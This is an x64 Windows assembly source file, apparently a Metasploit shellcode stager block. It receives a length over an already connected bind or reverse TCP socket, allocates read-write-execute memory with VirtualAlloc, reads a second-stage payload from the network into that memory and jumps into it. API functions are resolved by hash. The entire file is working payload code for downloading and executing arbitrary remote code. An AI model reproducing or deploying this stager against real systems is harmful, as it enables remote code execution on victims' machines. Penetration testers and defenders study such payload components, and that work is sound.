;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2003
; Architecture: x64
;-----------------------------------------------------------------------------;
[BITS 64]

; Compatible: block_bind_tcp, block_reverse_tcp

; Input: RBP must be the address of 'api_call'. RDI must be the socket.
; Output: None.
; Clobbers: RAX, RBX, RCX, RDX, RSI, R8, R9, R15

recv:
  ; Receive the size of the incoming second stage...
  sub rsp, 16            ; alloc some space (16 bytes) on stack for to hold the second stage length
  mov rdx, rsp           ; set pointer to this buffer
  xor r9, r9             ; flags
  push byte 4            ; 
  pop r8                 ; length = sizeof( DWORD );
  mov rcx, rdi           ; the saved socket
  mov r10d, 0x5FC8D902   ; hash( "ws2_32.dll", "recv" )
  call rbp               ; recv( s, &dwLength, 4, 0 );
  add rsp, 32            ; we restore RSP from the api_call so we can pop off RSI next
  ; Alloc a RWX buffer for the second stage
  pop rsi                ; pop off the second stage length
  mov esi, esi           ; only use the lower-order 32 bits for the size
  push byte 0x40         ; 
  pop r9                 ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; 
  pop r8                 ; MEM_COMMIT
  mov rdx, rsi           ; the newly recieved second stage length.
  xor rcx, rcx           ; NULL as we dont care where the allocation is.
  mov r10d, 0xE553A458   ; hash( "kernel32.dll", "VirtualAlloc" )
  call rbp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
  ; Receive the second stage and execute it...
  mov rbx, rax           ; rbx = our new memory address for the new stage
  mov r15, rax           ; save the address so we can jump into it later
read_more:               ;
  xor r9, r9             ; flags
  mov r8, rsi            ; length
  mov rdx, rbx           ; the current address into our second stages RWX buffer
  mov rcx, rdi           ; the saved socket
  mov r10d, 0x5FC8D902   ; hash( "ws2_32.dll", "recv" )
  call rbp               ; recv( s, buffer, length, 0 );
  add rbx, rax           ; buffer += bytes_received
  sub rsi, rax           ; length -= bytes_received
  test rsi, rsi          ; test length
  jnz short read_more    ; continue if we have more to read
  jmp r15                ; return into the second stage